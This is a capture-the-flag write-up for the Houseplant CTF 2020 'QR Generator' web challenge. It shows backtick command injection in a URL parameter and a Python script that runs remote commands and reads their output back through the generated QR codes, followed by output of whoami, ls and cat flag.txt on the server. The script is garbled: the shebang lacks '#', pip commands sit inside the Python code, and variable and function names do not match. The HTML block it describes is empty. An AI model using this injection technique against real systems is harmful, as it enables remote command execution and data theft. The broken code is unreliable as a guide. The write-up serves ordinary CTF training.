Houseplant CTF 2020 â€“ QR Generator

Category: web
Points: 50

Challenge

I was playing around with some stuff on my computer and found out that you can generate QR codes! I tried to make an online QR code generator, but it seems that's not working like it should be. Would you mind taking a look?
http://challs.houseplant.riceteacatpanda.wtf:30004
Dev: jammy
Hint! For some reason, my website isn't too fond of backticks...

Solution
The hint suggests a RCE.
Analyzing the HTML source code, an interesting comment can be found.
```html


QR Code Generator



QR Generator
Generate your QR codes here!






```
The endpoint of this QR code service is http://challs.houseplant.riceteacatpanda.wtf:30004/qr.
The QR code produced contains only the first char inserted. Using backticks, you can confirm the RCE. For example, sending echo 'X' command will return the QR code of the letter X.

http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text=`echo%20%27X%27`


You can write a Python script to exfiltrate output of executed commands.
```python
!/usr/bin/python
import requests
import sys
import time
import os
import base64
pit3 install pillow
pip3 install pyqrcode
pip3 install pyzbar
from PIL import Image
from pyzbar.pyzbar import decode
target_url = "http://challs.houseplant.riceteacatpanda.wtf:30004/qr?text={}"
headers = {
   "User-Agent": "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US);",
   "Accept-Encoding": "gzip, deflate",
   "Referer": "http://challs.houseplant.riceteacatpanda.wtf:30004/",
}
def executecommand(command):
    print("cmd > {}".format(command))
    commandoutput = ""
    i = 1
    finished = False
    while not finished:
        payload = "{}|base64|cut -c{}".format(command, i)
        qrcode = httpget(payload)
        qrcodeimagename = "qr.png"
        with open(qrcodeimagename, "wb") as qrcodeimage:
            qrcodeimage.write(qrcode)
        qrdata = decode(Image.open(qrcodeimagename))[0].data.decode("utf-8")
        if len(qrdata.strip()) > 0:
            commandoutput += qrdata
        else:
            finished = True
        os.remove(qrcodeimagename)
        i += 1
    print(base64.b64decode(commandoutput))
def httpget(payload):
    response = None
    responseok = False
    while not responseok:
        try:
            targetattacked = targeturl.format(payload)
            r = requests.get(targetattacked, headers=headers)
            response = r.content
            if r.statuscode == 200:
                responseok = True
                time.sleep(1)
            else:
                print("   ERROR!")
                time.sleep(10)
            if "PNG" not in r.text:
                raise Exception("PNG not found in response!")
        except:
            print("   EXCEPTION!")
            time.sleep(5 * 60)
    return response
execute_command(sys.argv[1])
```
You can interact launching the remote commands.

user@vm:~$ python3 -W ignore qr-generator-solver.py whoami
cmd > whoami
b'rtcp\n'
user@vm:~$ python3 -W ignore qr-generator-solver.py ls
cmd > ls
b'README.md\napp\nflag.txt\nnode_modules\npackage.json\nstart.sh'
user@vm:~$ python3 -W ignore qr-generator-solver.py "cat flag.txt"
cmd > cat flag.txt
b'rtcp{fl4gz_1n_qr_c0d3s???_b1c3fea}\n'

So the flag is the following.

rtcp{fl4gz_1n_qr_c0d3s???_b1c3fea}

